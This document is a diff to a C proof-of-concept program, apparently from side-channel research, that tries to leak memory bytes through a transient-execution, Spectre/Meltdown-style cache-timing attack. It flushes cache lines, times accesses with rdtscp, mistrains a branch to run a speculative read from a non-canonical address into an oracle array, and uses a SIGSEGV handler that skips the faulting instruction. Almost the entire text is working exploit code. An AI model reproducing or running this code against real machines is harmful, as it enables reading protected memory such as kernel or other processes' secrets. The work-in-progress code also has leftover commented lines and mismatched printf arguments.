@@ -34,8 +34,7 @@ int tlb_fd;
 int shadow_offset[1024];
 const int offset = 16;
 int shadow_offset[1024];
-
-unsigned char secval = 0xf2;
+volatile int* uncached_mem;
 uint64_t averg[256];
 int64_t averg_rnd[256];
 
@@ -44,9 +43,22 @@ size_t memsize;
 void* mem;
 
 void tlb_flush_all(){
-
-	pwrite(tlb_fd, 0x0, 100, 0x0);
 }
+
+static unsigned long long rdtscp() {
+	unsigned long long a, d;
+	asm volatile ("rdtscp" : "=a" (a), "=d" (d));
+	a = (d<<32) | a;
+	return a;
+}
+
+static unsigned long long rdtsc() {
+	unsigned long long a, d;
+	asm volatile ("rdtsc" : "=a" (a), "=d" (d));
+	a = (d<<32) | a;
+	return a;
+}
+
 
 void* sibl_thread(void* a){
 		while(1){
@@ -81,26 +93,43 @@ static inline void memaccess(void* p){
     *addr;
 }
 
-void __attribute__((optimize("-O0")))void_operations3(volatile char* a, volatile unsigned char* b){
-    char code_buf[512];
-    memcpy(code_buf, void_operations3, 512);
-    for(int ii = 0; ii < 100; ++ii) {
-            memset(&addr1[ii*64], secval, 64);
-	   clflush(&addr1[ii*64]);
-	   asm volatile("mfence");
-    }
+void __attribute__((optimize("-O0")))spec_access(volatile unsigned char* addrr){
+	if(*uncached_mem){
+		oraclearr[PG_SIZE*addrr[offset]];
+		oraclearr[PG_SIZE*addrr[offset]];
+	
+	}
+}
+
+void void_operations3(volatile char* a, volatile unsigned char* b){
+    unsigned char *addrr = addr3;
+    asm volatile("mfence");
     //read(tlb_fd, addr1, 0x0);
-    //addr1[offset];
+    //addr1[offset+128] = 0xfc;
     // oraclearr[PG_SIZE * addr3[offset]];
-    //for(int i = 0; i < 20; ++i) sched_yield();
-    oraclearr[PG_SIZE * addr3[offset]];
-    oraclearr[PG_SIZE * addr3[offset]]; // 0xfa
-    volatile unsigned char *r = NULL; // = secval; //  sender
-    oraclearr[PG_SIZE * *r]; // receiver; addr2 - not valid address
-    oraclearr[PG_SIZE * *r]; // receiver; addr2 - not valid address
-    //oraclearr[PG_SIZE * addr2[offset]]; // receiver; addr2 - not valid address
-    //oraclearr[PG_SIZE * addr2[offset]];
-};
+    *uncached_mem = 9;
+    for(int i = 0; i < 100; ++i){
+//	    spec_access(addr3); // train PHT
+	    if(i == 99){ *uncached_mem = 0; addrr = addr2;}
+	    for(unsigned int j = 0; j < 256; ++j){	
+                asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
+    	    }
+	    asm volatile("\tclflush (%0)\n"::"r"(uncached_mem));
+	//    addr3[offset] = 0xf3;
+	for(int i = offset + 1; i < offset + 64; ++i) addr1[i] = 0xe2;
+    	asm volatile("mfence");
+	addr1[offset ] = 0xe9; //  sender
+	mprotect(addr1, 4096, PROT_WRITE);
+	unsigned long long ttt1 = rdtscp();
+	addr1[offset ] = 0xe9; //  sender
+	unsigned long long ttt2 = rdtscp();
+    	spec_access(addrr);
+	mprotect(addr1, 4096, PROT_READ|PROT_WRITE);
+	*uncached_mem = 9;
+	addrr = addr3;
+    }
+	//    addr3[offset] = 0xfa;
+ };
 
 void void_operations2(int64_t *a, int64_t *b){
     while(*a > *b){
@@ -121,12 +150,6 @@ void void_operations1(int64_t *a, int64_t *b){
     return;
 }
 
-static unsigned long long rdtscp() {
-	unsigned long long a, d;
-	asm volatile ("rdtscp" : "=a" (a), "=d" (d) : : "rcx");
-	a = (d<<32) | a;
-	return a;
-}
 
 uint64_t time_access(volatile void* add){
 	uint64_t t1, t2;
@@ -136,12 +159,13 @@ uint64_t time_access(volatile void* add){
 	t2 = rdtscp();	
 	return (t2 - t1);
 }
+//pwrite(tlb_fd, 0x0, 100, 0x0);
 
 static void handler(int signum, siginfo_t *si, void* arg){
     ucontext_t *ucon = (ucontext_t*)arg;
-    //printf("SIGHANDLER\n");
+    printf("SIGHANDLER\n");
     // printf("SEGFAULT CODE LETS TEST FIRST BYTE %p\n", ucon->uc_mcontext.gregs[REG_RIP]);
-    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 17; // 19
+    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 19;//17;
 }
 
 
@@ -149,19 +173,19 @@ int  __attribute__((optimize("-O0")))main(void){
     register char loaded_val;
     volatile char *f;
     int64_t a = 100000000,b = 100;
-    uint64_t va_mask = 0x1000;
     struct sigaction sa;
     cpu_set_t my_set;
     sa.sa_handler = (void (*)(int))handler;
     sigemptyset(&sa.sa_mask);
     sa.sa_flags = SA_RESTART; 
     if (sigaction(SIGSEGV, &sa, NULL) == -1) return -1;
-
+    uncached_mem = (volatile int*)malloc(sizeof(int));
     addr1 = (char*)(((uint64_t)malloc(20*PG_SIZE) + 4096) & ~0xFFF );
     addr3 = (char*)(((uint64_t)malloc(20*PG_SIZE) + 4096) & ~0xFFF );
     addr2 = (volatile char*)(((uint64_t)addr1) & 0xffffffffffffffff  | 0xffff000000000000); //(char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
-    //printf("addr1[%p] : addr2[%p]\n",addr1, addr2);
-    addr1[offset+128] = 0xe3;
+    printf("addr1[%p] : addr2[%p]\n",addr1, addr2);
+    addr1[offset] = 0xe3;
+    *uncached_mem = 0;
     asm volatile("mfence");
     clflush(&addr1[offset]);
     asm volatile("\tclflush (%0)\n" : :"r"(addr1) : "memory");
@@ -172,17 +196,12 @@ int  __attribute__((optimize("-O0")))main(void){
     oraclearr = malloc(sizeof(char) * PG_SIZE*256);
     tmp_store = malloc(sizeof(unsigned));
     addr3[offset] = 0xfa;
-    
-    addr1[offset ] = secval; //  sender
-    memset(addr1, secval, 20*PG_SIZE);
-    
     pthread_t thread;
 
 //    pthread_create(&thread, NULL, sibl_thread, NULL);
     // EVERYTHING IS INITIALIZED
-
 experiments_:
-    //printf("Running experiments\n");
+    printf("Running experiments\n");
     memset(averg_rnd, 0x0, 256*sizeof(int64_t));
     memset(averg, 0x0, 256*sizeof(uint64_t));
     memset(oraclearr, 0xe0, sizeof(char) * PG_SIZE*256);
@@ -204,13 +223,13 @@ experiments_:
         memset(averg, 0x0, 256*sizeof(uint64_t));
         for(int i = 0; i < NUM_EXPR; ++i){
             int flag = 0;
-	    for(unsigned int j = 0; j < 256; ++j){	
-                asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
-            }
-	    for(int ii = 0; ii < 100; ++ii)
-	            asm volatile("\tclflush (%0)\n"::"r"((void*)&addr1[offset+ii]));
-	    tlb_flush_all();
-            void_operations1(&a, &b);
+	    //for(unsigned int j = 0; j < 256; ++j){	
+            //    asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
+            //}
+            
+            asm volatile("\tclflush (%0)\n"::"r"(uncached_mem));
+	    asm volatile("mfence");
+	    void_operations1(&a, &b);
 
             for(unsigned int j = 0; j < 256; ++j){	
                 averg[j] += time_access((void*)(oraclearr + PG_SIZE * j));
@@ -219,7 +238,7 @@ experiments_:
         uint64_t min = (uint64_t)-1;
         int minid = -1;
         for(int rn = 0; rn < 256; ++rn){
-            if((averg[rn]/NUM_EXPR) <= (min - 1) && rn != 0 && rn != addr3[offset]){
+            if((averg[rn]/NUM_EXPR) <= (min - 1) && rn != 0 /*&& rn != addr3[offset]*/){
                 min = averg[rn]/NUM_EXPR;
                 minid = rn;
             }
@@ -237,17 +256,14 @@ experiments_:
         if(averg_rnd[i] < winner_min){
             winner_min = averg_rnd[i];
         }
-	  //  printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
+//	    printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
     }
     if( (winner_max - winner_min) < (NUM_ROUNDS/3)) {
-        //printf("Not egnough confidence\n");
+        printf("Not egnough confidence\n");
         goto experiments_;
     }
-
-    //printf("ADRESSES WERE [%p] vs [%p] : %p\n", &addr1[offset], &addr2[offset], 0xffff9a433f79b000);
-    printf("0x%02x \n", winner, winner);
+  //  printf("ADRESSES WERE [%p] vs [%p] : %p\n", &addr1[offset], &addr2[offset], 0xffff9a433f79b000);
+    printf("0x%02x\n", winner, winner);
     return 1;
 }
 
-//
-//
